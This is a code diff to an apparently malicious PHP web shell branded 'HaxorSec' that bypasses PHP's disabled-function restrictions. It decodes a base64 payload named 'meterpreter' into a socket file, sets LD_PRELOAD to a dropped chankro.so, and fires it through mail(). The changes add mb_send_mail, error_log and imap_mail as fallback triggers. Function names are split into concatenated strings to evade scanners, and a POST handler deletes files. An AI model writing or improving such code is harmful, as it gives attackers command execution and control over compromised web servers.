@@ -197,11 +197,35 @@ function y($b) {
     $bd = "ba"."se"."64"."_"."de"."co"."de";
     return $bd($b);
 }
+if(function_exists('mail')) {
+    $mail = "<font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ]";
+} else {
+    $mail = "<font color='black'>[ mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('mb_send_mail')) {
+  $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+   $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('error_log')) {
+  $errr = "<font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $errr = "<font color='black'>[ error_log() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('imap_mail')) {
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='red'> [ OFF ]</font> ]<br>";
+}
+
+
+
+
 echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
 if (function_exists('mail')) {
-    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
+    echo $mail." ".$mbb." ".$errr." ".$impp;
 } else {
-    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
+    echo $mail." ".$mbb." ".$errr." ".$impp;
 }
 if (function_exists('putenv')) {
     echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
@@ -263,7 +287,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $m = "m"."a"."i"."l";
         $base = "ba"."se"."64"."_"."de"."co"."de";
         $en = "ba"."se"."64"."_"."en"."co"."de";
+        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
+        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
         $drnm = "d"."i"."r"."n"."a"."m"."e";
+        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
         $currentFilePath = $_SERVER['PHP_SELF'];
         $doc = $_SERVER['DOCUMENT_ROOT'];
         $directoryPath = $drnm($currentFilePath);
@@ -276,7 +303,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $a($full . '/acpid.socket', $base($meterpreter));
         $p('CHANKRO=' . $full . '/acpid.socket');
         $p('LD_PRELOAD=' . $full . '/chankro.so');
-        $m('a','a','a','a');
+        if(function_exists('mail')) {
+            $m('a','a','a','a');
+        } elseif(function_exists('mb_send_mail')) {
+            $mb('a','a','a','a'); 
+        } elseif(function_exists('error_log')) {
+            $err('a',1,'a');
+        } elseif(function_exists('imap_mail')) {
+            $imp('a','a','a');
+        }
+
     }elseif (isset($_POST['delete_file'])) {
         $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
         if (file_exists($fileToDelete)) {
